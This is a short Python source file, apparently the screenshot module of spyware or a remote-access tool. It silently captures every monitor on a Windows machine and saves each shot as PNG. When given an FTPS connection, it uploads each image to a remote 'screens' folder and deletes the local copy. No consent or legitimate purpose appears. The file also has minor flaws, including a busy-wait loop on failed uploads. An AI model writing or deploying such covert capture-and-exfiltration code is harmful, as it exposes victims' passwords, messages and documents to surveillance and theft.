import win32gui
import win32ui
import win32con
import win32api
from PIL import Image
import os
import time
from threading import Thread


# screen uploader func.
def screen_uploader(path,fname,ftps):

	ans = ftps.upload(path+ os.sep + fname,'screens',fname)
	while not ans:
		pass
	time.sleep(20)
	if os.path.isfile(path+ os.sep + fname):
		os.remove(path+ os.sep + fname)


def screen(path,ftps=None):

	# unique name for each shot
	name = time.asctime(time.localtime()).replace(' ', '_').replace(':', '-') + '.bmp'
	
	# grab a handle to the main desktop window
	hdesktop = win32gui.GetDesktopWindow()

	# determine the size of all monitors in pixels
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

	# create a device context
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)

	# create a memory based device context
	mem_dc = img_dc.CreateCompatibleDC()

	# create a bitmap object
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)

	# copy the screen into our memory device context
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
	
	# check if dir exists : create if not
	if not os.path.exists(path):
		os.mkdir(path)
		
	# save the bitmap to a file
	screenshot.SaveBitmapFile(mem_dc, path + os.sep + name)
	#print(path + os.sep +name)

	# convert the image, initial .bmp too large
	with Image.open(path + os.sep + name) as img:
		new_img = img.resize((width,height))
		new_name = name.replace('.bmp', '.png')
		new_img.save(path + os.sep + new_name,'png')

	# if ftps passed:
	if ftps:
		# make an uploader thread
		upload_screen_t = Thread(target=screen_uploader,args=(path,new_name,ftps))
		upload_screen_t.start()


	# free unneeded objects
	if os.path.isfile(path + os.sep + name):
		os.remove(path + os.sep + name)
	mem_dc.DeleteDC()
	win32gui.DeleteObject(screenshot.GetHandle())